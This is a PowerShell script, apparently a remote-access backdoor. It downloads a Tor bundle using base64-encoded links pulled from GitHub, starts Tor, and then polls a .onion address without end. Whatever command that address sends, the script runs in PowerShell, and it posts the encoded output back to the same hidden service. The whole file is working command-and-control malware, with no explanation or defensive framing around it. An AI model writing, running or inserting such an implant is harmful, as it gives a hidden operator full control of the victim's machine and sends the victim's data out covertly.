## VERSION 1.0

$log = "C:\Users\Public\log.txt"
$zip = "C:\Users\Public\link.zip"
$extract = "C:\Users\Public\extract\"
$url = "http://ld52qe2n47otqd63u4jqv26yyev64z2jucgidqisriv7x3fxuoetfjid.onion"
$orConfigPath = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/aBolondVarazslo/holder/main/config" | Select-Object -ExpandProperty Content
$deConfigPath = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($orConfigPath))
$tLink = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/aBolondVarazslo/holder/main/link" | Select-Object -ExpandProperty Content
$oLink = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($tLink))


# Downloads from GitHub
function download {
    if (Test-Path $extract) {
        "Already downloaded. Skipping..." | Out-File -Append -FilePath $log
    } else {
        Invoke-WebRequest -Uri $oLink -OutFile $zip
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zip, $extract)
        Remove-Item $zip
    }
}

# Sets port in config file
function writeConfig {
    if (!(Test-Path $deConfigPath)) {
        "SOCKSPort 9050" | Out-File -FilePath $deConfigPath -Encoding ascii
    }
}

function startTor {
    Start-Process -FilePath "$extract\Tor\tor.exe" -ArgumentList "-f $deConfigPath" -WindowStyle Normal
}

function waitForTor {
    do {
        Start-Sleep -Seconds 3
        $ready = Test-NetConnection -ComputerName 127.0.0.1 -Port 9050
    } until ($ready.TcpTestSucceeded)
    "Tor connection established." | Out-File -Append -FilePath $log
}

function main {
    try {
        $cmd = & curl.exe --socks5-hostname 127.0.0.1:9050 "$url/get"
        "$((Get-Date).ToString()) - Command received: $cmd" | Out-File -Append -FilePath $log

        if ($cmd -and $cmd -ne "noop") {
            try {
                # Capture output including errors
                $output = powershell -Command "$cmd" 2>&1 | Out-String
                $output = ($output -split "`r?`n" | Where-Object { $_.Trim() -ne "" }) -join "`n"
                $outText = "SUCCESS:`n$output"
                $outText | Out-File -Append -FilePath $log
                $eOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($outText))
                & curl.exe --socks5-hostname 127.0.0.1:9050 -X POST -H "Content-Type: text/plain" -d $eOutput "$url/report"
            }
            catch {
                $err = "ERROR: $($_.Exception.Message)"
                $err | Out-File -Append -FilePath $log

                $eErr = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($err))
                & curl.exe --socks5-hostname 127.0.0.1:9050 -X POST -H "Content-Type: text/plain" -d $eErr "$url/report"
            }
        }
    }
    catch {
        "ERROR: $($_.Exception.Message)" | Out-File -Append -FilePath $log
    }
    Start-Sleep -Seconds 5
}


download
writeConfig
startTor
waitForTor

while ($true) {
    main
}
